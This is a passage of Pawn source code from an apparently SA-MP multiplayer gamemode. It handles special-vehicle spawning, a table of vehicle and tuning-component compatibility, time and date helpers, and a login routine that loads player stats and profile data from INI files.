	AttachObjectToObject(obj,objveh[objvehid][ovObjectID],objectinfo[obj][opos][0] - objectinfo[objveh[objvehid][ovObjectID]][opos][0],objectinfo[obj][opos][1] - objectinfo[objveh[objvehid][ovObjectID]][opos][1],objectinfo[obj][opos][2] - objectinfo[objveh[objvehid][ovObjectID]][opos][2],0.0,0.0,0.0);
	objveh[objvehid][ovAttached][objveh[objvehid][ovAttacheds]] = obj;
	objveh[objvehid][ovAttacheds]++;
	return 1;
}
//=[SpawnSpecialVehicle]========================================================
stock SpawnSpecialVehicle(vehicleid)
{
	SetVehiclePos(vehicleid,vehicleinfo[vehicleid][vspawnpos][0],vehicleinfo[vehicleid][vspawnpos][1],vehicleinfo[vehicleid][vspawnpos][2]);
	SetVehicleZAngle(vehicleid,vehicleinfo[vehicleid][vspawnpos][2]);
	return 1;
}
//=[DestroySpecialVehicle]======================================================
stock DestroySpecialVehicle(v)
{
	vehicleinfo[v][vspecial] = 0;
	vehicleinfo[v][vspecialid] = -1;
	vehicleinfo[v][vspecialname] = 0;
	vehicleinfo[v][sv_ability] = 0;
	for(new i = 0; i < vehicleinfo[v][spobjects]; i++) DestroyObject(vehicleinfo[v][spobject][i]);
	DestroyVehicleEx(v);
	return 1;
}
//=[ANTI CRASH OPCODES] ========================================================
stock IsPlayerInInvalidNosVehicle(playerid)
{
	new vehicleid = GetPlayerVehicleID(playerid);
	#define MAX_INVALID_NOS_VEHICLES 52
	new InvalidNosVehicles[MAX_INVALID_NOS_VEHICLES] =
	{
		581,523,462,521,463,522,461,448,468,586,417,425,469,487,512,520,563,593,
		509,481,510,472,473,493,520,595,484,430,453,432,476,497,513,533,577,
		452,446,447,454,590,569,537,538,570,449,519,460,488,511,519,548,592
	};
 	if(IsPlayerInAnyVehicle(playerid))
  	{
   		for(new i = 0; i < MAX_INVALID_NOS_VEHICLES; i++)
     	{
      		if(GetVehicleModel(vehicleid) == InvalidNosVehicles[i]) return true;
       	}
   	}
   	return false;
}
stock IsComponentidCompatible(modelid, componentid)
{
    if(componentid == 1025 || componentid == 1073 || componentid == 1074 || componentid == 1075 || componentid == 1076 ||
         componentid == 1077 || componentid == 1078 || componentid == 1079 || componentid == 1080 || componentid == 1081 ||
         componentid == 1082 || componentid == 1083 || componentid == 1084 || componentid == 1085 || componentid == 1096 ||
         componentid == 1097 || componentid == 1098 || componentid == 1087 || componentid == 1086)
         return true;
    switch (modelid)
    {
        case 400: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 401: return (componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 114 || componentid == 1020 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 402: return (componentid == 1009 || componentid == 1009 || componentid == 1010);
        case 404: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 405: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1023 || componentid == 1000);
        case 409: return (componentid == 1009);
        case 410: return (componentid == 1019 || componentid == 1021 || componentid == 1020 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 411: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 412: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 415: return (componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 418: return (componentid == 1020 || componentid == 1021 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016);
        case 419: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 420: return (componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1003);
        case 421: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1016 || componentid == 1000);
        case 422: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007);
        case 426: return (componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003);
        case 429: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 436: return (componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 438: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 439: return (componentid == 1003 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1013);
        case 442: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 445: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 451: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 458: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 466: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 467: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 474: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 475: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 477: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007);
        case 478: return (componentid == 1005 || componentid == 1004 || componentid == 1012 || componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 479: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 480: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 489: return (componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016 || componentid == 1000);
        case 491: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 492: return (componentid == 1005 || componentid == 1004 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1016 || componentid == 1000);
        case 496: return (componentid == 1006 || componentid == 1017 || componentid == 1007 || componentid == 1011 || componentid == 1019 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1003 || componentid == 1002 || componentid == 1142 || componentid == 1143 || componentid == 1020);
        case 500: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 506: return (componentid == 1009);
        case 507: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 516: return (componentid == 1004 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1015 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 517: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 518: return (componentid == 1005 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 526: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 527: return (componentid == 1021 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1015 || componentid == 1017 || componentid == 1007);
        case 529: return (componentid == 1012 || componentid == 1011 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 533: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 534: return (componentid == 1126 || componentid == 1127 || componentid == 1179 || componentid == 1185 || componentid == 1100 || componentid == 1123 || componentid == 1125 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1180 || componentid == 1178 || componentid == 1101 || componentid == 1122 || componentid == 1124 || componentid == 1106);
        case 535: return (componentid == 1109 || componentid == 1110 || componentid == 1113 || componentid == 1114 || componentid == 1115 || componentid == 1116 || componentid == 1117 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1120 || componentid == 1118 || componentid == 1121 || componentid == 1119);
        case 536: return (componentid == 1104 || componentid == 1105 || componentid == 1182 || componentid == 1181 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1184 || componentid == 1183 || componentid == 1128 || componentid == 1103 || componentid == 1107 || componentid == 1108);
        case 540: return (componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 541: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 542: return (componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1015);
        case 545: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 546: return (componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 547: return (componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1016 || componentid == 1003 || componentid == 1000);
        case 549: return (componentid == 1012 || componentid == 1011 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 550: return (componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003);
        case 551: return (componentid == 1005 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003);
        case 555: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 558: return (componentid == 1092 || componentid == 1089 || componentid == 1166 || componentid == 1165 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1168 || componentid == 1167 || componentid == 1088 || componentid == 1091 || componentid == 1164 || componentid == 1163 || componentid == 1094 || componentid == 1090 || componentid == 1095 || componentid == 1093);
        case 559: return (componentid == 1065 || componentid == 1066 || componentid == 1160 || componentid == 1173 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1159 || componentid == 1161 || componentid == 1162 || componentid == 1158 || componentid == 1067 || componentid == 1068 || componentid == 1071 || componentid == 1069 || componentid == 1072 || componentid == 1070 || componentid == 1009);
        case 560: return (componentid == 1028 || componentid == 1029 || componentid == 1169 || componentid == 1170 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1141 || componentid == 1140 || componentid == 1032 || componentid == 1033 || componentid == 1138 || componentid == 1139 || componentid == 1027 || componentid == 1026 || componentid == 1030 || componentid == 1031);
        case 561: return (componentid == 1064 || componentid == 1059 || componentid == 1155 || componentid == 1157 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1154 || componentid == 1156 || componentid == 1055 || componentid == 1061 || componentid == 1058 || componentid == 1060 || componentid == 1062 || componentid == 1056 || componentid == 1063 || componentid == 1057);
        case 562: return (componentid == 1034 || componentid == 1037 || componentid == 1171 || componentid == 1172 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1149 || componentid == 1148 || componentid == 1038 || componentid == 1035 || componentid == 1147 || componentid == 1146 || componentid == 1040 || componentid == 1036 || componentid == 1041 || componentid == 1039);
        case 565: return (componentid == 1046 || componentid == 1045 || componentid == 1153 || componentid == 1152 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1150 || componentid == 1151 || componentid == 1054 || componentid == 1053 || componentid == 1049 || componentid == 1050 || componentid == 1051 || componentid == 1047 || componentid == 1052 || componentid == 1048);
        case 566: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 567: return (componentid == 1129 || componentid == 1132 || componentid == 1189 || componentid == 1188 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1187 || componentid == 1186 || componentid == 1130 || componentid == 1131 || componentid == 1102 || componentid == 1133);
        case 575: return (componentid == 1044 || componentid == 1043 || componentid == 1174 || componentid == 1175 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1176 || componentid == 1177 || componentid == 1099 || componentid == 1042);
        case 576: return (componentid == 1136 || componentid == 1135 || componentid == 1191 || componentid == 1190 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1192 || componentid == 1193 || componentid == 1137 || componentid == 1134);
        case 579: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 580: return (componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 585: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 587: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 589: return (componentid == 1005 || componentid == 1004 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1024 || componentid == 1013 || componentid == 1006 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 600: return (componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1022 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007);
        case 602: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 603: return (componentid == 1144 || componentid == 1145 || componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
    }
    return false;
}
//=[CreateViewOnlyVehicle]======================================================
stock CreateViewOnlyVehicle(modelid,Float:x,Float:y,Float:z,Float:a,color1,color2,vo=1)
{
	new v = CreateVehicleEx(modelid,x,y,z,a,color1,color2,respawntime,0,world_normal);
	vehicleinfo[v][onlyview] = vo, vehicleinfo[v][store] = 1;
	return v;
}
//=[DestroyVehicleEx]===========================================================
stock DestroyVehicleEx(v)
{
	if(!IsValidVehicle(v)) return 0;
	DestroyVehicle(v);
	vehicleinfo[v][lastdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][locked] = 0;
	vehicleinfo[v][store] = 0;
	vehicleinfo[v][vowner] = INVALID_PLAYER_ID;
	vehicleinfo[v][racedriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][kartdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][monsterdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][armydriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][vvalid] = 0;
	vehicleinfo[v][vemodel] = -1;
	vehicleinfo[v][vcantenter] = 0;
	vehicleinfo[v][vgm] = 0;
	vehicleinfo[v][vnpcs] = 0;
	vehicleinfo[v][tobein] = 0;
	return 1;
}
//=[IsValidVehicle]=============================================================
stock IsValidVehicle(v) return vehicleinfo[v][vvalid];
//=[GetTimeAsString]============================================================
stock GetTimeAsString(bool:withseconds = false)
{
	new t[3], s[64];
	gettime(t[0],t[1],t[2]);
	format(s,sizeof(s),"%02d:%02d",t[0],t[1]);
	if(withseconds) format(s,sizeof(s),"%s:%02d",s,t[2]);
	return s;
}
//=[GetDateAsString]============================================================
stock GetDateAsString(tav = '/')
{
	new d[3], s[64];
	getdate(d[0],d[1],d[2]);
	format(s,sizeof(s),"%02d%c%02d%c%d",d[2],tav,d[1],tav,d[0]);
	return s;
}
//=[GetLastConnectDate]=========================================================
stock GetLastConnectDate(uname[])
{
	new string[64];
	format(string,sizeof(string),"/DM/Users/%s.ini",uname);
	format(string,sizeof(string),"%02d/%02d/%02d",fgetint(string,"LastConnectDay"),fgetint(string,"LastConnectMonth"),fgetint(string,"LastConnectYear"));
	return string;
}
//=[IsValidSkin]================================================================
stock IsValidSkin(skinid) return _:(!(skinid < 0 || skinid > 311 || skinid == 74));
//=[GetRandomSkin]==============================================================
stock GetRandomSkin()
{
	new rnd = 312;
	do rnd = random(312);
	while !IsValidSkin(rnd);
	return rnd;
}
//=[LoginPlayer]================================================================
stock LoginPlayer(playerid)
{
	dbg(31,"1");
	new f[M_S], string[M_S], string2[M_S], key[64], d[3], File:fh, count = 0, flag = 0, sett[10] = {0,0,0,0,0,0,0,0,0,0}, sett2[10] = {0,0,0,0,0,0,0,0,0,0}, clanc[32], claim = 0;
	getdate(d[2],d[1],d[0]);
	for(new i=0;i<sizeof(adminnames);i++) if(!strcmp(GetName(playerid),adminnames[i],false)) playerinfo[playerid][pp] = 1;
	playerinfo[playerid][logged] = 1;
	format(f,sizeof(f),fuser(playerid));
	fsetstring(f,"LastUID",GetSerial(playerid));
	fsetstring(f,"LastConnectIP",GetIP(playerid));
	fsetstring(f,"LastChangeIPDate",GetDateAsString());
	fsetstring(f,"LastChangeIPTime",GetTimeAsString());
	fsetint(f,"LastConnectDay",d[0]);
	fsetint(f,"LastConnectMonth",d[1]);
	fsetint(f,"LastConnectYear",d[2]);
	fsetstring(f,"LastConnectTime",GetTimeAsString());
	for(new i = 1; i <= MAX_FRIENDS; i++)
	{
		format(string,sizeof(string),"Friend_%d",i);
		SetPVarString(playerid,string,"None");
	}
	if(!fkeyexist(f, "Claim")) claim = 1;
	fh = fopen(f,io_read);
	dbg(31,"2");
	#define ReadUserString(%1,%2,%3) else if(equal(key,%1) && GetPVarInt(playerid,key) != 1) format(%2,%3,flinevalue(string)), SetPVarInt(playerid,key,1), count++
    #define ReadUserInt(%1,%2) else if(equal(key,%1) && GetPVarInt(playerid,key) != 1) %2 = strval(flinevalue(string)), SetPVarInt(playerid,key,1), count++
    #define ReadUserFloat(%1,%2) else if(equal(key,%1) && GetPVarInt(playerid,key) != 1) %2 = floatstr(flinevalue(string)), SetPVarInt(playerid,key,1), count++
    #define ReadUserString_Formatted(%1,%2,%3,%4) else if(equal(key,%1) && GetPVarInt(playerid,key) != 1) format(%2,%3,%4(flinevalue(string))), SetPVarInt(playerid,key,1), count++
    #define ReadUserInt_Loop(%1,%2,%3) format(string2,sizeof(string2),%1,%3); if(equal(key,string2) && GetPVarInt(playerid,key) != 1) %2 = strval(flinevalue(string)), SetPVarInt(playerid,key,1), flag = 1
    #define ReadUserBool_Loop(%1,%2,%3) format(string2,sizeof(string2),%1,%3); if(equal(key,string2) && GetPVarInt(playerid,key) != 1) %2 = bool:strval(flinevalue(string)), SetPVarInt(playerid,key,1), flag = 1
	#define ReadUserActivity_Loop(%1) if(equal(key,%1)) act_LoadWin(playerid,key,strval(flinevalue(string))), flag = 1
	#define AddUserStringAsPVar_Loop(%1,%2) format(string2,sizeof(string2),%1,%2); if(equal(key,string2)) SetPVarString(playerid,key,flinevalue(string)), flag = 1
	#define PartOfLoop(%1) equal(firstchars(key,strlen(%1)),%1)
	while(fread(fh,string))
	{
		format(key,sizeof(key),flinekey(string));
		if(string[0] == ';' || strlen(string) < 3) continue;
  		ReadUserString("RegistrationDate",playerinfo[playerid][rdate],32);
		ReadUserInt("Kills",playerinfo[playerid][kills]);
		ReadUserInt("Deaths",playerinfo[playerid][deaths]);
		ReadUserInt("HeadShots",playerinfo[playerid][hshots]);
		ReadUserInt("Tables",playerinfo[playerid][tables]);
		ReadUserInt("PlayerLevel",playerinfo[playerid][level]);
		ReadUserInt("MissionTime",playerinfo[playerid][mstimenew]);
		ReadUserString("PlayerLevelName",playerinfo[playerid][slevelname],64);
		ReadUserInt("Energy",playerinfo[playerid][energy]);
		ReadUserInt("PlayerUPower",playerinfo[playerid][upower]);
		ReadUserInt("PlayerUPower2",playerinfo[playerid][upower2]);
		ReadUserInt("PlayerUPowerKeys",playerinfo[playerid][upowerkeys]);
		ReadUserInt("PlayerUPowerKeys2",playerinfo[playerid][upowerkeys2]);
		ReadUserInt("Bank",playerinfo[playerid][bank]);
		ReadUserInt("BankShare",playerinfo[playerid][bankshare]);
		ReadUserInt("CCard",playerinfo[playerid][ccard]);
		ReadUserInt("PVehicle",playerinfo[playerid][vehicle][0]);
		ReadUserInt("PVehicle2",playerinfo[playerid][vehicle][3]);
		ReadUserInt("PVehicle3",playerinfo[playerid][vehicle][5]);
		ReadUserInt("VehicleCost",playerinfo[playerid][vehicle][2]);
		ReadUserInt("Vehicle2Cost",playerinfo[playerid][vehicle][4]);
		ReadUserInt("Vehicle3Cost",playerinfo[playerid][vehicle][6]);
		ReadUserInt("VehicleColor1",playerinfo[playerid][pvcol][0]);
		ReadUserInt("VehicleColor2",playerinfo[playerid][pvcol][1]);
		ReadUserInt("VehiclePJ",playerinfo[playerid][pvpj]);
		ReadUserInt("Vehicle2Color1",playerinfo[playerid][pvcol2][0]);
		ReadUserInt("Vehicle2Color2",playerinfo[playerid][pvcol2][1]);
		ReadUserInt("VehicleFuel",playerinfo[playerid][fuel]);
		ReadUserInt("Vehicle3Color1",playerinfo[playerid][pvcol][0]);
		ReadUserInt("Vehicle3Color2",playerinfo[playerid][pvcol][1]);
		ReadUserInt("VehicleFuel",playerinfo[playerid][fuel]);
		ReadUserInt("Drugs",playerinfo[playerid][drugs]);
		ReadUserInt("Pet",playerinfo[playerid][pet][0]);
		ReadUserInt("LastMoney",playerinfo[playerid][lastmoney]);
		ReadUserInt("XJail1",playerinfo[playerid][xjail]);
		ReadUserInt("XNoCMD",playerinfo[playerid][nocmd]);
		ReadUserInt("ShowMe",playerinfo[playerid][showme]);
		ReadUserInt("Bomb",playerinfo[playerid][bomb]);
		ReadUserInt("BombKills",playerinfo[playerid][bombkills]);
		ReadUserInt("BombDamages",playerinfo[playerid][bombdmg]);
		ReadUserInt("Bonus_S",playerinfo[playerid][bonus_si]);
		ReadUserInt("Phone",playerinfo[playerid][phone]);
		ReadUserInt("PhoneModel",playerinfo[playerid][phonemodel]);
		ReadUserInt("PhoneDesign",playerinfo[playerid][phonedesign]);
		ReadUserInt("SpecialWeapon",playerinfo[playerid][spweapon]);
		ReadUserFloat("SavedX",playerinfo[playerid][mark][0]);
		ReadUserFloat("SavedY",playerinfo[playerid][mark][1]);
		ReadUserFloat("SavedZ",playerinfo[playerid][mark][2]);
		ReadUserInt("BugArmour",playerinfo[playerid][bugarmour]);
		ReadUserInt("PlayerHouse2",playerinfo[playerid][houseid]);
		ReadUserString("ClanCode",clanc,sizeof(clanc));
		ReadUserInt("ClanLevel",playerinfo[playerid][lclan]);
		ReadUserString("ClanTag",playerinfo[playerid][clantag],16);
		ReadUserString_Formatted("UsingClock_",playerinfo[playerid][mngpower],64,Decrypt);
		ReadUserInt("Org",playerinfo[playerid][org]);
		ReadUserInt("OrgLevel",playerinfo[playerid][lorg]);
		ReadUserInt("SAdmin",playerinfo[playerid][sadmin]);
		ReadUserInt("Reports",playerinfo[playerid][reports]);
		ReadUserInt("Skin",playerinfo[playerid][skin]);
		ReadUserInt("ProfileICQ",playerinfo[playerid][icq]);
		ReadUserString("ProfileMessenger",playerinfo[playerid][messenger],30);
		ReadUserString("ProfileSkype",playerinfo[playerid][skype],30);
		ReadUserString("ProfileFacebook",playerinfo[playerid][facebook],30);
		ReadUserString("ProfileEmail",playerinfo[playerid][email],30);
		ReadUserString("ProfileCountry",playerinfo[playerid][country],30);
		ReadUserInt("ProfileBirthDay",playerinfo[playerid][birthdate][0]);
		ReadUserInt("ProfileBirthMonth",playerinfo[playerid][birthdate][1]);
		ReadUserInt("ProfileBirthYear",playerinfo[playerid][birthdate][2]);
		ReadUserString("ProfileRealName",playerinfo[playerid][rname],16);
		ReadUserString("Tag2",playerinfo[playerid][tag],32);
		ReadUserInt("TagColor",playerinfo[playerid][tagcol]);
		ReadUserInt("MuteTime",playerinfo[playerid][mute][0]);
		ReadUserInt("JailTime",playerinfo[playerid][jail][0]);
		ReadUserInt("ClothesID",playerinfo[playerid][clothes]);
		ReadUserFloat("ClothesX",playerinfo[playerid][clothesp][0]);
		ReadUserFloat("ClothesY",playerinfo[playerid][clothesp][1]);
		ReadUserFloat("ClothesZ",playerinfo[playerid][clothesp][2]);
		ReadUserFloat("ClothesRX",playerinfo[playerid][clothesp][3]);
		ReadUserFloat("ClothesRY",playerinfo[playerid][clothesp][4]);
		ReadUserFloat("ClothesRZ",playerinfo[playerid][clothesp][5]);
		ReadUserInt("Clothes2ID",playerinfo[playerid][clothes2]);
		ReadUserFloat("Clothes2X",playerinfo[playerid][clothes2p][0]);
		ReadUserFloat("Clothes2Y",playerinfo[playerid][clothes2p][1]);
		ReadUserFloat("Clothes2Z",playerinfo[playerid][clothes2p][2]);
		ReadUserFloat("Clothes2RX",playerinfo[playerid][clothes2p][3]);
		ReadUserFloat("Clothes2RY",playerinfo[playerid][clothes2p][4]);
		ReadUserFloat("Clothes2RZ",playerinfo[playerid][clothes2p][5]);
		ReadUserInt("Border",playerinfo[playerid][bordershow]);
		ReadUserInt("BorderR",playerinfo[playerid][borderrgb][0]);
		ReadUserInt("BorderG",playerinfo[playerid][borderrgb][1]);
		ReadUserInt("BorderB",playerinfo[playerid][borderrgb][2]);
		ReadUserInt("BorderAlpha",playerinfo[playerid][borderalpha]);
		ReadUserString("SecretWord",playerinfo[playerid][secretword],MAX_SECURITY_WORD_LENGTH);
		ReadUserInt("NoName",playerinfo[playerid][noname]);
		ReadUserString("s0beitdate1",playerinfo[playerid][s0beitdate1],11);
		ReadUserString("s0beitdate2",playerinfo[playerid][s0beitdate2],11);
		ReadUserString("s0beitdate3",playerinfo[playerid][s0beitdate3],11);
		ReadUserFloat("BestCBug",playerinfo[playerid][bestcbug]);
		#if hanukkah_now
		ReadUserInt("donut_time", playerinfo[playerid][donuttime]);
		ReadUserInt("donuts", playerinfo[playerid][donut]);
		#endif
		else
		{
			flag = 0;
			if(PartOfLoop("UpgradeCommand_"))
			{
				for(new i = 0; i < sizeof(lcmds) && !flag; i++) if(lcmds[i][lcCL])
				{
					ReadUserInt_Loop("UpgradeCommand_%d",playerinfo[playerid][upgradecmd][lcmds[i][lcCMDID]],lcmds[i][lcCMDID]);
					if(playerinfo[playerid][upgradecmd][lcmds[i][lcCMDID]] > lcmds[i][lcMaxCL]) playerinfo[playerid][upgradecmd][lcmds[i][lcCMDID]] = lcmds[i][lcMaxCL];
				}
			}
			else if(PartOfLoop("VehicleMod"))
			{
				for(new i = 0; i <= 13 && !flag; i++)
				{
					ReadUserInt_Loop("VehicleMod%d",playerinfo[playerid][pvmod][i],i);
				}
			}
			else if(PartOfLoop("Setting"))
			{
				for(new i = 0; i < max_settings && !flag; i++)
				{
					ReadUserInt_Loop("Setting%d",playerinfo[playerid][setting][i],i);
				}
			}
			else if(PartOfLoop("PlayerWeapon"))
			{
				for(new i = 0; i < 10 && !flag; i++)
				{
					ReadUserInt_Loop("PlayerWeapon%d",playerinfo[playerid][weapons][i],i);
				}
			}
			else if(PartOfLoop("PlayerAmmo"))
			{
